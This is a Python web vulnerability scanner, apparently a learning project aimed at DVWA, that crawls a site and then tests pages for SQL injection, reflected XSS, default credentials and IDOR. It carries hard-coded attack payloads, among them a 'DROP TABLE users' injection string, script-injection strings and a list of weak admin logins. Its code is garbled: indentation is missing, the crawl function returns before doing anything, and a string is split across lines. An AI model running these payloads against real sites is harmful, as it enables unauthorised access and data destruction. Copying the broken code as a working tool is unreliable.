import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import pandas as pd
from datetime import datetime
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph,
Spacer
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet
HEADERS = {"User-Agent": "WebScanPro"}
TIMEOUT = 5
MAX_PAGES = 30
SQL_PAYLOADS = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users --"]
ERROR_KEYWORDS = ["syntax error", "mysql", "sql", "warning", "database"]
XSS_PAYLOADS = [
"<script>alert('xss')</script>",
"\"'><script>alert(1)</script>"
]
COMMON_CREDENTIALS = [
("admin", "admin"),
("user", "user"),
("test", "test123")
]
visited_urls = set()
crawl_results = []
sql_results = []
xss_results = []
auth_results = []
idor_results = []
def log_message(file, message):
with open(file, "a") as f:
f.write(f"{datetime.now()} - {message}\n")
def is_valid_url(url):
parsed = urlparse(url)
return bool(parsed.scheme) and bool(parsed.netloc)
def crawl(url):
return
if url in visited_urls or len(visited_urls) >= MAX_PAGES:
try:
r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
visited_urls.add(url)
soup = BeautifulSoup(r.text, "html.parser")
forms = soup.find_all("form")
inputs = soup.find_all("input")
crawl_results.append({
"URL": url,
"Forms_Count": len(forms),
"Input_Fields_Count": len(inputs),
"Page_Length": len(r.text)
})
log_message("logs/crawl_log.txt", f"Crawled: {url}")
for link in soup.find_all("a", href=True):
next_url = urljoin(url, link["href"])
if is_valid_url(next_url):
crawl(next_url)
except Exception as e:
log_message("logs/crawl_log.txt", f"Error: {str(e)}")
def ai_sql_analysis(text):
t = text.lower()
for k in ERROR_KEYWORDS:
if k in t:
return "VULNERABLE"
return "SAFE"
def test_sql(url):
for payload in SQL_PAYLOADS:
try:
test_url = f"{url}?id={payload}"
r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT)
verdict = ai_sql_analysis(r.text)
sql_results.append({
"URL": url,
"Payload": payload,
"AI_Verdict": verdict
})
except:
pass
def detect_xss(text, payload):
return "XSS VULNERABLE" if payload.lower() in text.lower() else "NOT
VULNERABLE"
def test_xss(url):
for payload in XSS_PAYLOADS:
try:
test_url = f"{url}?input={payload}"
r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT)
xss_results.append({
"URL": url,
"Payload": payload,
"Status": detect_xss(r.text, payload)
})
except:
pass
def test_auth(url):
for username, password in COMMON_CREDENTIALS:
try:
r = requests.post(url, data={"username": username, "password": password})
verdict = "WEAK AUTH" if "logout" in r.text.lower() else "FAILED"
auth_results.append({
"URL": url,
"Username": username,
"Auth": verdict
})
except:
pass
def test_session(url):
try:
r = requests.get(url)
verdict = "SESSION COOKIE PRESENT" if r.cookies else "NO SESSION"
auth_results.append({"URL": url, "Username": "N/A", "Auth": verdict})
except:
pass
def test_idor(url):
try:
for i in range(1, 6):
test_url = f"{url}?id={i}"
r = requests.get(test_url)
verdict = (
"POSSIBLE IDOR"
if (r.status_code == 200 and "denied" not in r.text.lower())
else "PROTECTED"
)
idor_results.append({"URL": url, "Tested_ID": i, "IDOR": verdict})
except:
pass
def severity(row):
s = str(row).lower()
if "idor" in s or "weak" in s or "vulnerable" in s:
return "HIGH"
if "possible" in s or "xss" in s:
return "MEDIUM"
return "LOW"
def generate_report():
frames = []
try: frames.append(pd.DataFrame(sql_results))
except: pass
try: frames.append(pd.DataFrame(xss_results))
except: pass
try: frames.append(pd.DataFrame(auth_results))
except: pass
try: frames.append(pd.DataFrame(idor_results))
except: pass
report = pd.concat(frames, ignore_index=True)
report["Severity"] = report.apply(lambda r: severity(r), axis=1)
report.to_csv("reports/security_report.csv", index=False)
def generate_pdf():
df = pd.read_csv("reports/security_report.csv")
doc = SimpleDocTemplate("reports/final_security_report.pdf", pagesize=A4)
styles = getSampleStyleSheet()
elements = [
Paragraph("WebScanPro Security Report", styles["Title"]),
Spacer(1, 18)
]
table = Table([df.columns.tolist()] + df.values.tolist())
table.setStyle(TableStyle([
('GRID',(0,0),(-1,-1),0.5,colors.black),
('BACKGROUND',(0,0),(-1,0),colors.lightgrey)
]))
elements.append(table)
doc.build(elements)
def main():
target = input("Enter target website (example: http://localhost/DVWA): ")
crawl(target)
urls = [x["URL"] for x in crawl_results]
for url in urls:
test_sql(url)
test_xss(url)
test_auth(url)
test_session(url)
test_idor(url)
generate_report()
generate_pdf()
print("All scans completed. Reports generated.")
if __name__ == "__main__":
main()
